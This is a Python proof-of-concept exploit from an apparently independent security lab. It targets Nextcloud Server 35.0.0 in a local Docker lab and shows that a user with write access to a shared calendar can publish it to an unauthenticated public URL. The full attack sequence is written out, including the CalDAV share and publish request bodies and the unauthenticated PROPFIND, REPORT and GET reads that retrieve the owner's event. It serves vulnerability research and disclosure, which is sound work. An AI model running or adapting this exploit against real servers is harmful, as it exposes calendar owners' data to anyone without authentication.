#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: nextcloud-calendar-sharee-publish (High)
#  Vendor: Nextcloud GmbH
#  Versions: Nextcloud Server 35.0.0
#  Impact: Write-sharee publishes owner calendar to an unauthenticated URL
#  Requires: write-sharee, owner-limit default no, CS:publish-calendar
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "nextcloud-calendar-sharee-publish"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Local oracle for unpublished Nextcloud write-sharee calendar publish.

Write-sharee (can edit) POSTs CS:publish-calendar on the owner's shared
calendar. PublishPlugin only checks {DAV:}write; dav
limitAddressBookAndCalendarSharingToOwner defaults to no. Unauthenticated
PROPFIND/REPORT /remote.php/dav/public-calendars/{token} returns the owner's
non-PRIVATE event.

Loopback only. No shells. CardDAV out of scope.
"""
from __future__ import annotations

import base64
import json
import os
import re
import subprocess
import xml.etree.ElementTree as ET
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

HERE = Path(__file__).resolve().parent
BASE = os.environ.get("NC_URL", "http://127.0.0.1:18344").rstrip("/")
ADMIN = os.environ.get("NC_ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("NC_ADMIN_PASSWORD", "LabAdmin35!")
OWNER = os.environ.get("NC_OWNER_USER", "owner")
OWNER_PASS = os.environ.get("NC_OWNER_PASSWORD", "LabOwner35!")
SHAREE = os.environ.get("NC_SHAREE_USER", "sharee")
SHAREE_PASS = os.environ.get("NC_SHAREE_PASSWORD", "LabSharee35!")
WITNESS = "NEXTCLOUD-CAL-SHAREE-PUBLISH-WITNESS"
CAL_URI = "labcal"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "nextcloud-calendar-sharee-publish")
NS = {
    "d": "DAV:",
    "cs": "http://calendarserver.org/ns/",
    "c": "urn:ietf:params:xml:ns:caldav",
    "oc": "http://owncloud.org/ns",
}

MKCALENDAR_BODY = """<?xml version="1.0" encoding="utf-8" ?>
<c:mkcalendar xmlns:c="urn:ietf:params:xml:ns:caldav" xmlns:d="DAV:" xmlns:a="http://apple.com/ns/ical/" xmlns:o="http://owncloud.org/ns">
  <d:set>
    <d:prop>
      <d:displayname>labcal</d:displayname>
      <o:calendar-enabled>1</o:calendar-enabled>
      <a:calendar-color>#21213D</a:calendar-color>
      <c:supported-calendar-component-set>
        <c:comp name="VEVENT"/>
      </c:supported-calendar-component-set>
    </d:prop>
  </d:set>
</c:mkcalendar>
""".encode()

SHARE_BODY = f"""<?xml version="1.0" encoding="utf-8" ?>
<CS:share xmlns:D="DAV:" xmlns:CS="http://owncloud.org/ns">
  <CS:set>
    <D:href>principal:principals/users/{SHAREE}</D:href>
    <CS:summary>lab share write</CS:summary>
    <CS:read-write/>
  </CS:set>
</CS:share>
""".encode()

PUBLISH_BODY = b"""<?xml version="1.0" encoding="utf-8" ?>
<CS:publish-calendar xmlns:CS="http://calendarserver.org/ns/" />
"""

PROPFIND_PUBLISH_URL = b"""<?xml version="1.0" encoding="utf-8" ?>
<d:propfind xmlns:d="DAV:" xmlns:cs="http://calendarserver.org/ns/">
  <d:prop>
    <cs:publish-url/>
  </d:prop>
</d:propfind>
"""

PROPFIND_CALDATA = b"""<?xml version="1.0" encoding="utf-8" ?>
<d:propfind xmlns:d="DAV:" xmlns:c="urn:ietf:params:xml:ns:caldav" xmlns:oc="http://owncloud.org/ns">
  <d:prop>
    <d:displayname/>
    <d:getetag/>
    <d:resourcetype/>
    <c:calendar-data/>
    <oc:read-only/>
    <cs:publish-url xmlns:cs="http://calendarserver.org/ns/"/>
  </d:prop>
</d:propfind>
"""

CALENDAR_QUERY = b"""<?xml version="1.0" encoding="utf-8" ?>
<c:calendar-query xmlns:d="DAV:" xmlns:c="urn:ietf:params:xml:ns:caldav">
  <d:prop>
    <d:getetag/>
    <c:calendar-data/>
  </d:prop>
  <c:filter>
    <c:comp-filter name="VCALENDAR">
      <c:comp-filter name="VEVENT"/>
    </c:comp-filter>
  </c:filter>
</c:calendar-query>
"""

EVENT_ICS = f"""BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Abraxas Labs//CalDAV Lab//EN
CALSCALE:GREGORIAN
BEGIN:VEVENT
UID:nextcloud-cal-sharee-publish-witness
DTSTAMP:20260115T120000Z
DTSTART:20260115T130000Z
DTEND:20260115T140000Z
SUMMARY:{WITNESS}
DESCRIPTION:{WITNESS}
CLASS:PUBLIC
END:VEVENT
END:VCALENDAR
""".replace("\n", "\r\n").encode()


def fail(msg: str) -> None:
    print(f"FAIL NEXTCLOUD-CAL-SHAREE-PUBLISH {msg}", flush=True)
    raise SystemExit(1)


def basic(user: str, password: str) -> str:
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def http(
    method: str,
    url: str,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 60.0,
) -> tuple[int, dict[str, str], bytes]:
    hdrs = {"User-Agent": "nextcloud-calendar-sharee-publish-lab"}
    if headers:
        hdrs.update(headers)
    req = Request(url, data=data, headers=hdrs, method=method)
    try:
        with urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            return resp.status, {k.lower(): v for k, v in resp.headers.items()}, body
    except HTTPError as exc:
        return exc.code, {k.lower(): v for k, v in exc.headers.items()}, exc.read()
    except URLError as exc:
        fail(f"http {method} {url} error {exc}")
    return 0, {}, b""


def ocs(method: str, path: str, user: str, password: str) -> tuple[int, dict]:
    hdrs = {
        "OCS-APIRequest": "true",
        "Accept": "application/json",
        "Authorization": basic(user, password),
    }
    sep = "&" if "?" in path else "?"
    url = BASE + path + sep + "format=json"
    code, _, raw = http(method, url, headers=hdrs)
    text = raw.decode("utf-8", "replace")
    try:
        parsed = json.loads(text) if text else {}
    except json.JSONDecodeError:
        fail(f"ocs {method} {path} http={code} not json body={text[:400]!r}")
    return code, parsed if isinstance(parsed, dict) else {}


def ocs_data(parsed: dict) -> dict | list | None:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict):
        return ocs_wrap.get("data")
    return None


def groups_from_userinfo(parsed: dict) -> list[str]:
    data = ocs_data(parsed)
    groups: object = []
    if isinstance(data, dict):
        groups = data.get("groups") or []
        if isinstance(groups, dict):
            if "element" in groups:
                el = groups["element"]
                groups = el if isinstance(el, list) else [el]
            else:
                groups = list(groups.values())
    if not isinstance(groups, list):
        return [str(groups)]
    return [str(g) for g in groups]


def dav(
    method: str,
    path: str,
    user: str | None,
    password: str | None,
    *,
    data: bytes | None = None,
    extra_headers: dict[str, str] | None = None,
) -> tuple[int, dict[str, str], bytes]:
    hdrs: dict[str, str] = {}
    if user is not None and password is not None:
        hdrs["Authorization"] = basic(user, password)
    if extra_headers:
        hdrs.update(extra_headers)
    return http(method, BASE + path, data=data, headers=hdrs)


def parse_xml(raw: bytes) -> ET.Element | None:
    text = raw.decode("utf-8", "replace")
    if not text.strip():
        return None
    try:
        return ET.fromstring(text)
    except ET.ParseError:
        return None


def all_hrefs(root: ET.Element | None) -> list[str]:
    if root is None:
        return []
    out: list[str] = []
    for el in root.iter():
        tag = el.tag
        if tag == "{DAV:}href" or tag.endswith("}href") or tag == "href":
            if el.text:
                out.append(el.text.strip())
    return out


def xml_text(raw: bytes) -> str:
    return raw.decode("utf-8", "replace")


def compose_occ(*args: str, timeout: int = 60) -> str:
    proc = subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", "-u", "www-data", "nextcloud", "php", "occ", *args],
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )
    return (proc.stdout or "") + (proc.stderr or "")


def extract_token(hrefs: list[str], body: str) -> str | None:
    for href in hrefs:
        m = re.search(r"public-calendars/([^/?#]+)", href)
        if m:
            return m.group(1).rstrip("/")
    m = re.search(r"public-calendars/([^/?#<\s]+)", body)
    if m:
        return m.group(1).rstrip("/")
    return None


def pick_shared_calendar(hrefs: list[str]) -> str | None:
    wanted = f"{CAL_URI}_shared_by_{OWNER}"
    for href in hrefs:
        if wanted in href and "/inbox" not in href and "/outbox" not in href:
            path = href
            if "://" in path:
                path = "/" + path.split("/", 3)[-1] if path.count("/") >= 3 else path
                # href may be absolute; keep from /remote.php or /calendars
                idx = path.find("/remote.php/")
                if idx >= 0:
                    path = path[idx:]
                else:
                    idx = path.find("/calendars/")
                    if idx >= 0:
                        path = "/remote.php/dav" + path[idx:]
            if not path.startswith("/"):
                path = "/remote.php/dav/calendars/" + SHAREE + "/" + path.lstrip("/")
            if not path.endswith("/"):
                path += "/"
            return path
    return None


def main() -> None:
    print(f"IOC base={BASE} owner={OWNER} sharee={SHAREE} cal={CAL_URI}", flush=True)

    limit_out = compose_occ("config:app:get", "dav", "limitAddressBookAndCalendarSharingToOwner").strip()
    print(f"IOC dav-limitAddressBookAndCalendarSharingToOwner={limit_out!r}", flush=True)
    if limit_out == "yes":
        fail("limitAddressBookAndCalendarSharingToOwner=yes")

    code, parsed = ocs("GET", "/ocs/v2.php/cloud/users/" + SHAREE, SHAREE, SHAREE_PASS)
    groups = groups_from_userinfo(parsed)
    print(f"IOC sharee-login http={code} groups={groups}", flush=True)
    if code not in (200, 201):
        fail(f"sharee login/info http={code}")
    if "admin" in [g.lower() for g in groups]:
        fail("sharee is in admin group (wrong fixture)")

    code, parsed = ocs("GET", "/ocs/v2.php/cloud/users/" + OWNER, OWNER, OWNER_PASS)
    owner_groups = groups_from_userinfo(parsed)
    print(f"IOC owner-login http={code} groups={owner_groups}", flush=True)
    if code not in (200, 201):
        fail(f"owner login/info http={code}")

    cal_path = f"/remote.php/dav/calendars/{OWNER}/{CAL_URI}"
    mk_code, _, mk_body = dav(
        "MKCALENDAR",
        cal_path,
        OWNER,
        OWNER_PASS,
        data=MKCALENDAR_BODY,
        extra_headers={"Content-Type": "application/xml; charset=utf-8"},
    )
    print(f"IOC mkcalendar http={mk_code} body={xml_text(mk_body)[:200]!r}", flush=True)
    if mk_code not in (201, 204, 200, 405):
        # occ may have created it already (405/already exists) or 201
        if mk_code not in (409,):
            fail(f"mkcalendar http={mk_code} body={xml_text(mk_body)[:300]!r}")

    ev_path = f"{cal_path}/witness.ics"
    put_code, _, put_body = dav(
        "PUT",
        ev_path,
        OWNER,
        OWNER_PASS,
        data=EVENT_ICS,
        extra_headers={"Content-Type": "text/calendar; charset=utf-8"},
    )
    print(f"IOC put-event http={put_code} body={xml_text(put_body)[:200]!r}", flush=True)
    if put_code not in (201, 204, 200):
        fail(f"put event http={put_code} body={xml_text(put_body)[:300]!r}")

    share_code, share_hdrs, share_body = dav(
        "POST",
        cal_path + "/",
        OWNER,
        OWNER_PASS,
        data=SHARE_BODY,
        extra_headers={"Content-Type": "application/xml; charset=utf-8"},
    )
    sabre_share = share_hdrs.get("x-sabre-status", "")
    print(
        f"IOC share http={share_code} sabre={sabre_share!r} body={xml_text(share_body)[:240]!r}",
        flush=True,
    )
    if share_code not in (200, 201, 204):
        fail(f"share http={share_code} body={xml_text(share_body)[:400]!r}")

    list_code, _, list_body = dav(
        "PROPFIND",
        f"/remote.php/dav/calendars/{SHAREE}/",
        SHAREE,
        SHAREE_PASS,
        data=PROPFIND_CALDATA,
        extra_headers={"Content-Type": "application/xml; charset=utf-8", "Depth": "1"},
    )
    list_text = xml_text(list_body)
    hrefs = all_hrefs(parse_xml(list_body))
    print(f"IOC sharee-propfind http={list_code} hrefs={hrefs}", flush=True)
    if list_code not in (207, 200):
        fail(f"sharee calendar list http={list_code} body={list_text[:400]!r}")
    shared_path = pick_shared_calendar(hrefs)
    if not shared_path:
        fail(f"shared calendar uri missing hrefs={hrefs}")
    if "read-only>true" in list_text.lower() and f"{CAL_URI}_shared_by_{OWNER}" in list_text:
        # oc:read-only true on the shared calendar means view-only share (wrong fixture)
        shared_snip = list_text.lower()
        if re.search(
            rf"{re.escape(CAL_URI)}_shared_by_{re.escape(OWNER)}[\s\S]{{0,800}}read-only>\s*true",
            shared_snip,
        ):
            fail("share was read-only")
    print(f"IOC shared-calendar-uri={shared_path}", flush=True)

    pub_code, pub_hdrs, pub_body = dav(
        "POST",
        shared_path,
        SHAREE,
        SHAREE_PASS,
        data=PUBLISH_BODY,
        extra_headers={"Content-Type": "application/xml; charset=utf-8"},
    )
    sabre = pub_hdrs.get("x-sabre-status", "")
    print(
        f"IOC publish http={pub_code} sabre={sabre!r} body={xml_text(pub_body)[:300]!r}",
        flush=True,
    )
    if pub_code == 403:
        fail("POST 403")
    if pub_code != 202:
        fail(f"publish http={pub_code} sabre={sabre!r} body={xml_text(pub_body)[:400]!r}")
    if sabre and sabre != "everything-went-well":
        fail(f"publish sabre={sabre!r}")

    url_code, _, url_body = dav(
        "PROPFIND",
        shared_path,
        SHAREE,
        SHAREE_PASS,
        data=PROPFIND_PUBLISH_URL,
        extra_headers={"Content-Type": "application/xml; charset=utf-8", "Depth": "0"},
    )
    url_text = xml_text(url_body)
    token = extract_token(all_hrefs(parse_xml(url_body)), url_text)
    print(f"IOC publish-url http={url_code} token={token!r} body={url_text[:500]!r}", flush=True)
    if url_code not in (207, 200) or not token:
        fail(f"publish-url missing http={url_code} body={url_text[:400]!r}")

    public_path = f"/remote.php/dav/public-calendars/{token}"
    unauth_code, unauth_hdrs, unauth_body = dav(
        "PROPFIND",
        public_path,
        None,
        None,
        data=PROPFIND_CALDATA,
        extra_headers={"Content-Type": "application/xml; charset=utf-8", "Depth": "1"},
    )
    unauth_text = xml_text(unauth_body)
    print(
        f"IOC unauth-propfind http={unauth_code} sabre={unauth_hdrs.get('x-sabre-status', '')!r} bytes={len(unauth_body)}",
        flush=True,
    )

    found = WITNESS in unauth_text
    if not found:
        report_code, _, report_body = dav(
            "REPORT",
            public_path + "/",
            None,
            None,
            data=CALENDAR_QUERY,
            extra_headers={"Content-Type": "application/xml; charset=utf-8", "Depth": "1"},
        )
        report_text = xml_text(report_body)
        print(f"IOC unauth-report http={report_code} bytes={len(report_body)}", flush=True)
        if WITNESS in report_text:
            found = True
            unauth_text = report_text
            unauth_code = report_code
        else:
            child_hrefs = all_hrefs(parse_xml(unauth_body)) + all_hrefs(parse_xml(report_body))
            for href in child_hrefs:
                if not href.rstrip("/").endswith(".ics"):
                    continue
                path = href
                idx = path.find("/remote.php/")
                if idx >= 0:
                    path = path[idx:]
                elif path.startswith("/"):
                    pass
                else:
                    continue
                get_code, _, get_body = dav("GET", path, None, None)
                get_text = xml_text(get_body)
                print(f"IOC unauth-get http={get_code} path={path} bytes={len(get_body)}", flush=True)
                if WITNESS in get_text:
                    found = True
                    unauth_text = get_text
                    unauth_code = get_code
                    break

    print(f"IOC unauth-read contains-witness={found} snippet={unauth_text[:400]!r}", flush=True)
    if not found:
        fail(f"unauth read missing witness http={unauth_code} body={unauth_text[:400]!r}")

    print(
        f"SUCCESS NEXTCLOUD-CAL-SHAREE-PUBLISH who=write-sharee unauth-read=yes {WITNESS}",
        flush=True,
    )


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"unhandled {type(exc).__name__}: {exc}")

